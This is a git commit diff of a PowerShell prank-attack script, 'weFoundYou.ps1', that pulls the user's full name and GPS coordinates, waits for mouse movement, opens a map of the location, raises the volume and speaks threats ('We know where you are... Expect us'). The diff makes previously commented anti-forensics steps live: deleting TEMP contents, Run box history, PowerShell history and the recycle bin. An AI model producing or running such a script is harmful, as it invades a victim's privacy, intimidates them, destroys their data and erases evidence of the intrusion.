8999fbafef487eb1cb01a9c7edf0e735915494b6
Hopeless0001 <102414401+Hopeless0001@users.noreply.github.com>
2022-06-08 12:36:35 +0200

    Update weFoundYou.ps1

--- we-found-you/weFoundYou.ps1
+++ we-found-you/weFoundYou.ps1
@@ -1,21 +1,78 @@
 function Get-fullName {
 
     try {
+
     $fullName = Net User $Env:username | Select-String -Pattern "Full Name";$fullName = ("$fullName").TrimStart("Full Name")
+
     }
+ 
     catch {Write-Error "No name was detected" 
     return $env:UserName
     -ErrorAction SilentlyContinue
     }
+
     return $fullName 
 
 }
 
 $FN = Get-fullName
 
-# Set Volume
-$k=[Math]::Ceiling(100/2);$o=New-Object -ComObject WScript.Shell;for($i = 0;$i -lt $k;$i++){$o.SendKeys([char] 175)}
 
+function Get-GeoLocation{
+	try {
+	Add-Type -AssemblyName System.Device 
+	$GeoWatcher = New-Object System.Device.Location.GeoCoordinateWatcher
+	$GeoWatcher.Start() 
+
+	while (($GeoWatcher.Status -ne 'Ready') -and ($GeoWatcher.Permission -ne 'Denied')) {
+		Start-Sleep -Milliseconds 100
+	}  
+
+	if ($GeoWatcher.Permission -eq 'Denied'){
+		Write-Error 'Access Denied for Location Information'
+	} else {
+		$GeoWatcher.Position.Location | Select Latitude,Longitude
+		
+	}
+	}
+    catch {Write-Error "No coordinates found" 
+    return "No Coordinates found"
+    -ErrorAction SilentlyContinue
+    } 
+
+}
+
+function Pause-Script{
+Add-Type -AssemblyName System.Windows.Forms
+$originalPOS = [System.Windows.Forms.Cursor]::Position.X
+$o=New-Object -ComObject WScript.Shell
+
+    while (1) {
+        $pauseTime = 3
+        if ([Windows.Forms.Cursor]::Position.X -ne $originalPOS){
+            break
+        }
+        else {
+            $o.SendKeys("{CAPSLOCK}");Start-Sleep -Seconds $pauseTime
+        }
+    }
+}
+
+$GL = Get-GeoLocation
+
+$GL = $GL -split " "
+
+$Lat = $GL[0].Substring(11) -replace ".$"
+
+$Lon = $GL[1].Substring(10) -replace ".$"
+
+Pause-Script
+
+Start-Process "https://www.latlong.net/c/?lat=$Lat&long=$Lon"
+
+Start-Sleep -s 3
+
+$k=[Math]::Ceiling(100/2);$o=New-Object -ComObject WScript.Shell;for($i = 0;$i -lt $k;$i++){$o.SendKeys([char] 175)}
 
 $s=New-Object -ComObject SAPI.SpVoice
 $s.Rate = -2
@@ -24,23 +81,10 @@ $s.Speak("We know where you are")
 $s.Speak("We are everywhere")
 $s.Speak("Expect us")
 
+rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue
 
-#
-# No evidence
-#
+reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
 
-# Delete contents of Temp folder 
+Remove-Item (Get-PSreadlineOption).HistorySavePath
 
-#Remove-Item $env:TEMP\* -r -Force -ErrorAction SilentlyContinue
-#
-## Delete run box history
-#
-#reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
-#
-## Delete powershell history
-#
-#Remove-Item (Get-PSreadlineOption).HistorySavePath
-#
-## Deletes contents of recycle bin
-#
-#Clear-RecycleBin -Force -ErrorAction SilentlyContinue
+Clear-RecycleBin -Force -ErrorAction SilentlyContinue
